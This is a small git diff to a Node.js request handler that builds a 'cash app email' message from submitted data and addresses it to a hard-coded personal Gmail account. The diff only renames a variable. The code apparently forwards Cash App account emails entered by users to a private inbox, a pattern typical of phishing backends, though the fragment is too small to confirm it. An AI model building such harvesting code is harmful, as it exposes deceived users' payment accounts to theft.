@@ -53,7 +53,7 @@ exports.email = (req, res) => {
     console.log(req.body)
 
     try {
-        const message = `cash app email:${emailSent}`
+        const message = `cash app email:${emails}`
         console.log(message)
         const reason = 'CashApp email'
         const email = 'techt5562@gmail.com'
